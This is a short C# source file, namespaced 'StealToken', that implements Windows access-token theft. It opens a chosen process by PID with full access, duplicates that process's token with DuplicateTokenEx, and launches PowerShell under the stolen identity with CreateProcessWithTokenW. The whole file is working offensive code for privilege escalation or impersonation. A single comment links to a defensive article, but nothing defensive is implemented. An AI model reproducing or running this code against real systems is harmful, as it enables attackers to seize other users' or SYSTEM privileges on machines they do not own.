using System;
using System.Text;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;

namespace StealToken.Token
{
    class TokenOps
    {

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        int processId);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle,
        UInt32 DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken,
           uint dwDesiredAccess,
           IntPtr lpTokenAttributes,
           uint ImpersonationLevel,
           uint TokenType,
           out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken,
            //UInt32 dwLogonFlags,
            LogonFlags dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);


        public static void TokenTheft(int pid)
        {

            //https://posts.specterops.io/understanding-and-defending-against-access-token-theft-finding-alternatives-to-winlogon-exe-80696c8a73b

            IntPtr openProcessRes = OpenProcess(0x001F0FFF, true, pid);

            IntPtr currentToken;
            bool openProcessToken = OpenProcessToken(openProcessRes, 0x0002, out currentToken);

            IntPtr newToken = IntPtr.Zero;
            DuplicateTokenEx(currentToken, 0xF01FF, IntPtr.Zero, 2, 2, out newToken);
            IntPtr env = IntPtr.Zero;

            STARTUPINFO si = new STARTUPINFO();
            si.wShowWindow = 3;
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool cRes = CreateProcessWithTokenW(newToken, LogonFlags.WithProfile, null, @"C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe", 0, env, null, ref si, out pi);

        }

    }
}
